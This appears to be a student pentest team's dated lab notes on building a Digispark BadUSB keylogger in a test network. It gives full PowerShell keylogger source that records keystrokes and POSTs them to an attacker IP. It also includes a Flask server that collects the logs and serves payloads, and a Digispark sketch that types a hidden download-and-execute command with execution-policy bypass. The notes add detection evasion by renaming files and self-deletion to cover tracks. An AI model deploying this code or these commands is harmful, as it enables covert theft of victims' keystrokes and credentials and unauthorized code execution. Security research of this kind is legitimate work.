As miljonka finished the .exe payload to include mailing the keylogs to email address, i also edited the current .ps1 to include the same function.    
Source:    
https://github.com/SriRam-Macha/DigiSpark-Keylogger-Payload/blob/master/Keystrokes%20Mailer%20Script.ps1

Finished:    
[helper2.ps1](notes_res/helper2.ps1)  

Working:   
![](notes_res/notes-%2012.png)

*Demo coming later on.* 

**Todo:**   
*Sending the keypresses as POST requests to server?*

---
### 26.10.2023
*Sending file(s) from powershell to simple webserver in Linux*

I made a `testfile.txt` to good old "Temp"
![](notes_res/notes-%2013.png)

The setup itself is the same again:
- Windows 10
- Kali Linux
And both are assigned to the same internal network for testing purposes.

Reason to try the POST method for sending the keylogs, that i wouldnt have to expose any passwords to victim device, as what happens in the mailing.

POST request to web server:
```bash
powershell Invoke-WebRequest -Uri http://192.168.66.2/server -Method POST -ContentType 'text/plain' -InFile ""`$env`:temp\testfile.txt""
```

Where `192.168.66.2` is the actual ip of the attacker machine and `/server` will be the webhook endpoint.

Simple server script, using Flask, on attacker machine:   
```python
#!/bin/python3
from flask import Flask, request

app = Flask(__name__)

@app.route('/server', methods=['POST'])
def handle_webhook():
   if request.method == 'POST':
       data = request.data
       print("Received data:", data.decode("utf-8"))
       return "Webhook data received", 200
   else:
       return "Unsupported method", 501

if __name__ == '__main__':
   app.run(host='192.168.66.2', port=80)
```

Running:   
![](notes_res/notes-%2014.png)

Sending:   
![](notes_res/notes-%2015.png)

And received:   
![](notes_res/notes-%2016.png)

To write the data automatically to file, i modified the webhook script:   
![](notes_res/notes-%2017.png)

Same tests again: Run, Execute, Receive, Check:   
![](notes_res/notes-%2018.png)

**Working.**

Modified the keylogger script, replacing the mailing with POST request to server:   
```powershell
$TimesToRun = 1                         # How many times to run the script.
$RunTimeP = 1             		# Time in minutes.
$endpoint = "192.168.66.2/server"       # Address to send the file to.
############################

$TimeStart = Get-Date
$TimeEnd = $timeStart.addminutes($RunTimeP)

#requires -Version 2
function Start-Helper($Path="$env:temp\help.txt") 
{
  $signatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

  $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru

  $null = New-Item -Path $Path -ItemType File -Force

  try
  {

    $Runner = 0
        while ($TimesToRun  -ge $Runner) {
        while ($TimeEnd -ge $TimeNow) {
      Start-Sleep -Milliseconds 40
      
      for ($ascii = 9; $ascii -le 254; $ascii++) {
        $state = $API::GetAsyncKeyState($ascii)

        if ($state -eq -32767) {
          $null = [console]::CapsLock

          $virtualKey = $API::MapVirtualKey($ascii, 3)

          $kbstate = New-Object Byte[] 256
          $checkkbstate = $API::GetKeyboardState($kbstate)

          $mychar = New-Object -TypeName System.Text.StringBuilder

          $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)

          if ($success) 
          {
            [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode) 
          }
        }
      }
          $TimeNow = Get-Date
    }
        Invoke-WebRequest -Uri http://$endpoint -Method POST -ContentType 'text/plain' -InFile $Path
        Remove-Item -Path $Path -force
        }
  }
  finally
  {
        exit 1
  }
}
Start-Helper
```

**Testings:**

It should now as it is:
- Run and log the keys for one minute
- Send them to server and delete the log file

But not working, the servers shows an error:   
![](notes_res/notes-%2019.png)

Checked the logs from the victim, as it shows still there, while it should have been deleted.   
Probably the error stopped the script:   
![](notes_res/notes-%2020.png)

I did this many times again and again, and finally figured, it must be that the logger formats the text as UTF-16...

![](notes_res/notes-%2022.png)

While the Flask tries to decode UTF-8 format:
![](notes_res/notes-%2023.png)

We had a discussion with the Project Team, and as Miljonka's .exe keylogger logs them in UTF-8, it must be with the script im using.   

After some investigations and alot of coffee i figured it out:    
![](notes_res/notes-%2024.png)   
I switched the Unicode to UTF8   

Ran it again, it seems to be working fine, except for the linebreak:   
![](notes_res/notes-%2025.png)

While debugging, it's actually ok, but probably an issue with the terminal itself:   
```bash
┌──(kali🥦kali)-[~/testing]
└─$ file received_data.txt 
received_data.txt: Unicode text, UTF-8 (with BOM) text, with CR line terminators
                                                                                                                    
┌──(kali🥦kali)-[~/testing]
└─$ cat received_data.txt
                                                                                                                    
┌──(kali🥦kali)-[~/testing]
└─$ hexdump -C received_data.txt

00000000  ef bb bf c3 b6 c3 b6 0d  c3 a4 c3 a4 c3 a4 0d 6d  |...............m|
00000010  79 20 70 61 73 73 77 6f  72 64 20 69 73 20 3a 20  |y password is : |
00000020  72 6f 6f 74 73 73 73 73  73 0d 74 65 73 74 69 6e  |rootsssss.testin|
00000030  67 20 6b 65 79 73 20 2f  2f 20 3a 3a 20 3f 3f 20  |g keys // :: ?? |
00000040  21 21 21 20 c3 b6 c3 a4  20 c3 b6 c3 a4 c3 b6 0d  |!!! .... .......|
00000050

```

And while opening it through gui:    
![](notes_res/notes-%2026.png)

**So that should be settled!**   

Finalized files (for now anyway):   
Had to do slight editing to make the loop work and not fail if the file doesnt exists, meaning if there where no keypresses.   
Now it just keeps rolling until the amount of loop is done that is assigned.   

*keylogger and everything related, is renamed to helper, to avoid any detections*    

Server:   
[webhook](/scripts/webhook/webhook)   
Keylogger scripts:   
[helper_mail.ps1](/payloads/keylogger/keylog_ps/helper_mail.ps1)   
[helper_post.ps1](/payloads/keylogger/keylog_ps/helper_post.ps1)   

*Not obfuscated for now. But that process is explained before and will be implemented whenever needed.*

---
### 31.10.2023
*Execution policies*

While testing and stuff, i found out, that by default, the execution of scripts is disabled from atleast normal user.

[Microsoft - ExecutionPolicy](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.3)  

Default in Windows 10:   
![](notes_res/notes-%2027.png)

Luckily (for us...) Windows let's user to change the CurrentUser policy to Bypass, which allows the execution, with:   
```
Set-ExecutionPolicy Bypass -Scope CurrentUser
```

Or for a single run:   
```
powershell -ExecutionPolicy Bypass \PATH\TO\SCRIPT.ps1
```

In our testing Victim, the LocalMachine ExecutionPolicy was Bypass, so had to change that with powershell as admin:    
```
Set-ExecutionPolicy Undefined -Scope LocalMachine
```
To make it really a default for Win10.   

After this, i had to tinker the Digispark payload for Keylogger script, to run the malicious script the mentioned `Bypass`.

```ino
DigiKeyboardFi.print("powershell -w Hidden -c \"(New-Object System.Net.WebClient).DownloadFile(\'URL_TO_DOWNLOAD_THE_SCRIPT\', \\\"$env:Temp\\maltsu.ps1\\\"); powershell -ExecutionPolicy Bypass \\\"$env:Temp\\maltsu.ps1\\\"\"");
```

And updated the file:   
[digispark_keylog.ino](https://github.com/therealhalonen/PhishSticks/commit/3b344965f29c275a46f313c8dded384b7144c329)

[Demo video]()

---

### 10.11.2023
*Improving the keylogger script*   

An idea we had in the meeting, when talking about either persistence or/and "covering the tracks", was that the keylogger script would be good to be deleted, when successfully done with the objectives it was meant to do.

First it was pretty straightforward to add the file deletion to the script itself, after the "runs" where done:    
![](notes_res/notes-%2028.png)

This worked flawlessly, and also added there a line, to make sure, there is no keylog file left behind either, just in case some errors etc happens.

Then...    
As the script was design and meant to be used so, that it has a specified time for each run and specified amount of runs it will do, Sawulohi came up with the idea, that we should implement some sort of mechanic there to the script, that it would start to run, if there are no keypresses detected.    

*In a nutshell, meaning that as is, it now could send 10 empty logs, and finish...*

I tinkered around with the script and pretty much found out, that its only possible if im in the interactive console...   
So i couldnt get it to work, when the script is running hidden in the background...   

I spent hours in testing back and forth and came up with the idea:   
- Always create an empty log file before each run
- If the log file is still empty after the run is finished:
	- Dont POST and "Dont count it as succesfull run"
- Only count successful runs and compare them to the TimesToRun.

This worked out Ok, and basically, it now stays running in the background, doing the loggings, but if no keypresses are recorded to the log file, it doesnt do any actions but begins from the start again, without increasing the "successful runs"

Script:   
```bash
$TimesToRun = 2                         # How many successful runs to achieve.
$RunTimeP = 0.5                         # Runtime in minutes for each run.
$endpoint = "http://192.168.66.2/server"  # Address to send the file to.

# Requires -Version 2
function Start-Helper($Path = "$env:temp\help.txt") 
{
  $signatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

  $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
  New-Item -Path $Path -ItemType File -Force

  $successfulRuns = 0  # Counter for successful runs

  try {
    while ($successfulRuns -lt $TimesToRun) {
      $TimeStart = Get-Date
      $TimeEnd = $TimeStart.AddMinutes($RunTimeP)

      while ($TimeNow -le $TimeEnd) {
        Start-Sleep -Milliseconds 40
        $fileCreated = $false  # Flag to track if the file is created in this loop.

        for ($ascii = 9; $ascii -le 254; $ascii++) {
          $state = $API::GetAsyncKeyState($ascii)

          if ($state -eq -32767) {
            $null = [console]::CapsLock

            $virtualKey = $API::MapVirtualKey($ascii, 3)

            $kbstate = New-Object Byte[] 256
            $checkkbstate = $API::GetKeyboardState($kbstate)

            $mychar = New-Object -TypeName System.Text.StringBuilder

            $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)

            if ($success) 
            {
              [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::UTF8) 
              $fileCreated = $true  # File is created.
            }
          }
        }

        $TimeNow = Get-Date
      }

      # Check if the file is not null or whitespace before making the POST request
      if ((Get-Content -Path $Path) -match '\S') {
        Invoke-WebRequest -Uri $endpoint -Method POST -ContentType 'text/plain' -InFile $Path
        Remove-Item -Path $Path -Force
        $successfulRuns++
      }

      # Create an empty file for the next run.
      New-Item -Path $Path -ItemType File -Force
    }
  }
  finally
  {
    # Remove the script and log file after it finishes running.
        Remove-Item -Path $env:temp\*.ps1 -Force
        Remove-Item -Path $Path -Force
    exit 1
  }
}

Start-Helper

```

*One downside there is, for example, if the time per run is one hour, and if it detects a keypress in the 0:59 mark, it will log for one minute before making the POST request and completing the run.*

***Another thing, based on my own perversions, and while writing the instruction files.***

We had already the [webhook, to accept the POST requests](https://github.com/therealhalonen/PhishSticks/blob/b70c6265d9b277f79b5e4eb81b33b2e40d492d6b/scripts/webhook/README.md), to be used with our Keylogger.  And while writing the instructions/READMEs for [Digispark stuff](https://github.com/therealhalonen/PhishSticks/tree/master/digispark), i thought about the fact that our Digispark payloads, as we test and ran them, downloads the malwares: Keylogger script, Ransomware, from our Github.   
Which is cool of course, but as if someone else wants to try them, they would need to get the scripts and stuff to their preferred location and edit them to according to their specs, they would need to host the files from somewhere, where the Digispark execution thing would download them from....    

So i decided to give it a try, to modify the `webhook` to also accept GET requests.   
The goal was:   
Have the malware/payload available from the same location as where the keylogs will be sent to. So kind of like AllInOne script and only one device needed to do it all.   

I also wanted it so, that there would be two endpoints.  One for POST and one for GET `/filename`    
This was fairly easy peasy, as Flask is a simple thing.    
With couple of tests, the final working, was:     
```python
# Handling GET requests to the '/server/<filename>' endpoint
@app.route('/server/<filename>', methods=['GET'])
def handle_webhook_get(filename):
    try:
        # Sending the specified file as an attachment in the response
        return send_file(filename, as_attachment=True)
    except FileNotFoundError:
        # Returning a 404 status code if the file is not found
        return "File not found", 404
```

Now if there were for example `test.file` in the folder, where the script is ran, it could be fetched with:   
```bash
wget http://address/server/test.file
```

Full script:
```python
#!/bin/python3
from flask import Flask, request, send_file
import os

app = Flask(__name__)

# Function to get the next available log number
def get_next_log_number():
    log_number = 1
    while os.path.exists(f'log-{log_number}.txt'):
        log_number += 1
    return log_number

# Handling POST requests to the '/server' endpoint
@app.route('/server', methods=['POST'])
def handle_webhook_post():
    # Checking if the request method is POST
    if request.method == 'POST':
        # Getting the data from the request
        data = request.data
        # Getting the next available log number
        log_number = get_next_log_number()
        # Generating the log filename based on the log number
        log_filename = f'log-{log_number}.txt'

        # Writing the received data to the log file
        with open(log_filename, 'w') as file:
            file.write(data.decode("utf-8"))

        # Returning a response indicating successful receipt and logging of data
        return f"Webhook data received and logged as {log_filename}", 200
    else:
        # Returning a 501 status code for unsupported methods
        return "Unsupported method", 501

# Handling GET requests to the '/server/<filename>' endpoint
@app.route('/server/<filename>', methods=['GET'])
def handle_webhook_get(filename):
    try:
        # Sending the specified file as an attachment in the response
        return send_file(filename, as_attachment=True)
    except FileNotFoundError:
        # Returning a 404 status code if the file is not found
        return "File not found", 404

# Running the Flask app if this script is executed directly
if __name__ == '__main__':
    # Configuring the Flask app to run on a specific host and port
    app.run(host='192.168.66.2', port=80)
```

**Note:**   
It is in no way, a fully working web service as there are no security stuff added, meaning no authentication and also no file browsing. So user needs to now what to GET.   

But after a test drive with Digispark, it works as it was supposed to!   
Edited the Digispark commands:   
```bash
#include <DigiKeyboardFi.h>

void setup() {}

void loop() {

// Description: Keylogger 1.0
DigiKeyboard.delay(1000);
DigiKeyboard.sendKeyStroke(0);
DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
DigiKeyboard.delay(500);
DigiKeyboardFi.print("powershell -w Hidden -c \"(New-Object System.Net.WebClient).DownloadFile(\'http://192.168.66.2/server/logger.ps1\', \\\"$env:Temp\\helper.ps1\\\"); powershell -ExecutionPolicy Bypass \\\"$env:Temp\\helper.ps1\\\"\"");
DigiKeyboard.delay(1000);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(3000);
exit(0);
}
```

`192.168.66.2` is my attacker machine IP   

![](notes_res/notes-%2029.png)   
- One GET request received.   
- Two POST requests received.   
- Two logs recorded.   

**Profit!**

### 16.11.2023
*Debugging and fixing the keylogger*

Miljonka ran several tests with the keylogger and found out issues.   
Issues were mostly related to readability of the logfile in attacker machine.   
Linebreaks werent right and some text didnt display correctly.   

While i was previously strugling with the UTF-8 encoding and stuff, i found out this:   

https://phoenixnap.com/kb/convert-dos-to-unix   
*Files created in DOS/Windows use carriage return (\\r) and line feed (\\n) for line endings. However, files in Unix/Linux solely use line feed.
Therefore, when transferring a file from one system to another, make sure to convert the files.*

Final one of the tests, as the initial test was too long to report... Mostly change little bit of this, most of the times without ANY output or loads of errors...     

**Test:**
- Expected log in server, as the log in victim device was 100% right:   
```
Line

Another Line

Third line

ÖÖ ÄÄ ÖÖ ÄÄ !!
```

- Outcome, server side:   
```bash
──(kali🥦kali)-[~/pentest_site]
└─$ cat log-2.txt 
ÖÖ ÄÄ ÖÖ ÄÄ !!                                                                                                                 
┌──(kali🥦kali)-[~/pentest_site]
└─$ file log-2.txt 
log-2.txt: Unicode text, UTF-8 (with BOM) text, with CR line terminators

┌──(kali🥦kali)-[~/pentest_site]
└─$ cat -v log-2.txt 
M-oM-;M-?Line^M^MAnother Line^M^MThird line^M^MM-CM-^VM-CM-^V M-CM-^DM-CM-^D M-CM-^VM-CM-^V M-CM-^DM-CM-^D !!                                         
```

Someone could say "this was interesting", but mostly frustrating to me!   

The `^M` had something do with the line endings or something like that...
But his gave a nice clue, when opening it in `nano` and it displayed it correctly:
![](notes_res/notes-%2030.png)

So the Keylogger does its own s\*it, Windows its own etc etc...   
I had tested to previously fix these with `dos2unix` BUT:
![](notes_res/notes-%2031.png)

Done!   
But the actual fun part was just ahead! AUTOMATIOOOOOOON!    
While that is the kind of like foolproof approach, a `tr` is the way to go for hacker and tech minded person!   

Had to do another test run to get the "ugly" log, and use `tr` mentioned also in the previously linked article, to convert the mac line endings to unix style:
```bash
tr '\r' '\n' < log-1.txt > log-1_unix.txt
```

![](notes_res/notes-%2032.png)

Working, but still manual.   
Easy peasy to add it to the python:
```python
if b'\r' in data:
	data = data.replace(b'\r', b'\n')
```


So the edited `webhook`
```python
#!/bin/python3
from flask import Flask, request, send_file
import os

app = Flask(__name__)

# Function to get the next available log number
def get_next_log_number():
    log_number = 1
    while os.path.exists(f'log-{log_number}.txt'):
        log_number += 1
    return log_number

# Handling POST requests to the '/server' endpoint
@app.route('/server', methods=['POST'])
def handle_webhook_post():
    # Checking if the request method is POST
    if request.method == 'POST':
        # Getting the data from the request
        data = request.data

        # Check if the data contains Mac-style line endings
        if b'\r' in data:
            # Replace Mac-style line endings with Unix-style line endings
            data = data.replace(b'\r', b'\n')

        # Getting the next available log number
        log_number = get_next_log_number()
        # Generating the log filename based on the log number
        log_filename = f'log-{log_number}.txt'

        # Writing the received data to the log file
        with open(log_filename, 'wb') as file:
            file.write(data)

        # Returning a response indicating successful receipt and logging of data
        return f"Webhook data received and logged as {log_filename}", 200
    else:
        # Returning a 501 status code for unsupported methods
        return "Unsupported method", 501

# Handling GET requests to the '/server/<filename>' endpoint
@app.route('/server/<filename>', methods=['GET'])
def handle_webhook_get(filename):
    try:
        # Sending the specified file as an attachment in the response
        return send_file(filename, as_attachment=True)
    except FileNotFoundError:
        # Returning a 404 status code if the file is not found
        return "File not found", 404

# Running the Flask app if this script is executed directly
if __name__ == '__main__':
    # Configuring the Flask app to run on a specific host and port
    app.run(host='192.168.66.2', port=80)
```
*Note: 192.168.66.2 is still the address of my internal network used in these pentestings.*   

And outcome:   
![](notes_res/notes-%2033.png)

**Working like it should, again, and for now...**

### 20.11.2023
*Webhook adjustments*

Made couple of adjustments to our webhook based on the Flask documentations:   
https://tedboy.github.io/flask/generated/flask.send_file.html    
*Please never pass filenames to this function from user sources; you should use `send_from_directory()` instead.*

And also little bit of anti-fuzzing to the endpoints.  

### 21.11.2023
*Mitigations and bypassing*

While writing our [Mitigations documentation](https://github.com/therealhalonen/PhishSticks/blob/master/documentation/Mitigations.md), and testing the blocking of removable devices, i wanted to show of the bypassing for the "Prevent installation of devices that match any of these device instance IDs" -policy.    
In a nutshell, what i wanted to test, is 
1. Blocking the Digispark 
2. Using our previously created [VID, PID, DeviceName and VendorName Changer](https://github.com/therealhalonen/PhishSticks/tree/master/scripts/usbconfig) to bypass the block.

**WIP**